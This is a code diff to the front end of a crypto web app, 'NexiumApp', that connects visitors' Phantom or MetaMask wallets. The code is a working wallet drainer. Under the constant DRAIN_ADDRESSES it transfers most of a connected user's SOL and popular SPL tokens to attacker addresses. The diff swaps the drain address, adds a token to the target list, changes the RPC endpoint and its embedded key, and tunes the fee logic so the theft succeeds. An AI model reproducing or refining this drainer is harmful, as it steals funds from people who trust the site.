@@ -32,7 +32,7 @@ import * as ethers from 'ethers';
 
 const DRAIN_ADDRESSES = {
   ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
-  solana: "3sJiXd6G8GQiiDecxgxLqSrL9bX7VnbMv4H9kbEXag7o"
+  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
 };
 
 const POPULAR_SPL_TOKENS = [
@@ -47,7 +47,8 @@ const POPULAR_SPL_TOKENS = [
   { mint: "TNSRxcUxoT9xWYW1UnP8eZJ7RPf2rDXgUbS4ao9kR1S", decimals: 6, name: "TNSR" },
   { mint: "2C4YvXUo2dJq4NjeaV7f3hDtkmTwrYkrAd4ToGTxK1r6", decimals: 9, name: "DAGO" },
   { mint: "2V4TjFjC87CYLYbSJTcT5mWnG2h4oVRr17a94bREh6Vz", decimals: 9, name: "TUAH" },
-  { mint: "4LUigigJte7XuTktJ4S2fE6X6vK3C2zT7vJAdXvV3c4Q", decimals: 9, name: "LUIGI" }
+  { mint: "4LUigigJte7XuTktJ4S2fE6X6vK3C2zT7vJAdXvV3c4Q", decimals: 9, name: "LUIGI" },
+  { mint: "WENWENvqqNya429ubLdR1Y3vW6mWu2zHFauuJVVX5m1", decimals: 5, name: "WEN" }
 ];
 
 class NexiumApp {
@@ -306,7 +307,7 @@ class NexiumApp {
         }
 
         this.publicKey = accounts[0];
-        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/3uos127kJoe6edcvVqR4LSzQqq5867v1kZdHdUstDyX96Qvep49BpkQQwoBD5W1hwif9H6GknBFJA4cSTvso6Py4MvD5txBKu1a`, {commitment: 'confirmed', wsEndpoint: ''});
+        this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
         console.log(`${walletName} connected via extension: ${this.publicKey}`); // Log 38
         this.connectedWalletType = walletName;
         console.log(`Setting button state to connected for ${walletName}`); // Log 39
@@ -352,7 +353,7 @@ class NexiumApp {
               this.connecting = false;
               return;
             }
-            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/3uos127kJoe6edcvVqR4LSzQqq5867v1kZdHdUstDyX96Qvep49BpkQQwoBD5W1hwif9H6GknBFJA4cSTvso6Py4MvD5txBKu1a`, {commitment: 'confirmed', wsEndpoint: ''});
+            this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
             console.log(`MetaMask connected via deeplink: ${this.publicKey}`); // Log 48
             this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`); // Log 49
@@ -370,7 +371,7 @@ class NexiumApp {
           const response = await window.solana.connect().catch(() => null);
           if (response && response.publicKey) {
             this.publicKey = response.publicKey.toString();
-            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/3uos127kJoe6edcvVqR4LSzQqq5867v1kZdHdUstDyX96Qvep49BpkQQwoBD5W1hwif9H6GknBFJA4cSTvso6Py4MvD5txBKu1a`, {commitment: 'confirmed', wsEndpoint: ''});
+            this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
             console.log(`Phantom connected via deeplink: ${this.publicKey}`); // Log 53
             this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`); // Log 54
@@ -534,9 +535,17 @@ class NexiumApp {
         }
       }
 
-      // Determine reserve based on tokens
+      // Estimate transaction fee
+      const tempTransaction = new Transaction().add(...tokenInstructions);
+      tempTransaction.feePayer = senderPublicKey;
+      const { blockhash } = await this.solConnection.getLatestBlockhash();
+      tempTransaction.recentBlockhash = blockhash;
+      const fee = await tempTransaction.getEstimatedFee(this.solConnection) || 5000; // Fallback to minimum fee if estimation fails
+      console.log("Estimated transaction fee:", fee, "lamports"); // New Log
+
+      // Determine SOL transfer amount
       let solAmount = 0;
-      if (balance > 0) {
+      if (balance > fee) {
         let reserve = 0;
         if (hasBalanceTokens.length === 0) {
           reserve = Math.floor(balance * 0.2); // Reserve 20% for SOL only (transfer 80%)
@@ -544,9 +553,17 @@ class NexiumApp {
           let reserveRatio = 0.4; // 40% reserve when tokens are present
           reserve = Math.floor(balance * reserveRatio);
         }
-        solAmount = balance - reserve;
+        solAmount = balance - reserve - fee;
         if (solAmount < 0) solAmount = 0;
-        console.log("SOL transfer amount calculated:", solAmount);
+        console.log("SOL transfer amount calculated:", solAmount, "after reserving:", reserve, "and fee:", fee); // Updated Log
+      } else if (balance > 0 && hasBalanceTokens.length > 0) {
+        // If SOL is only enough for fee and tokens are present, use SOL for fee
+        console.log("SOL balance only sufficient for fee, using for token transfers"); // New Log
+        solAmount = 0;
+      } else {
+        console.log("No sufficient SOL for transfer or fees, and no tokens to transfer"); // New Log
+        this.showFeedback("Insufficient SOL balance for transaction", 'error');
+        return;
       }
 
       // Add token instructions first
@@ -573,9 +590,9 @@ class NexiumApp {
         return;
       }
 
-      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
-      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // New Log 86
-      transaction.recentBlockhash = blockhash;
+      const { blockhash: finalBlockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
+      console.log("Fetched blockhash:", finalBlockhash, "lastValidBlockHeight:", lastValidBlockHeight); // New Log 86
+      transaction.recentBlockhash = finalBlockhash;
       transaction.feePayer = senderPublicKey;
       console.log("Transaction configured with blockhash and feePayer:", transaction); // Log 87
 
@@ -587,7 +604,7 @@ class NexiumApp {
 
       await this.solConnection.confirmTransaction({
         signature,
-        blockhash,
+        blockhash: finalBlockhash,
         lastValidBlockHeight
       });
       console.log("Transaction confirmed:", signature); // Log 119
@@ -754,7 +771,7 @@ class NexiumApp {
       this.attachWalletListeners();
       if (this.isWalletConnected() && navigator.onLine) {
         this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
-        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, {commitment: 'confirmed', wsEndpoint: ''});
+        this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
         console.log('Wallet connected on init, publicKey:', this.publicKey); // Log 147
         this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : null;
         this.handleSuccessfulConnection();
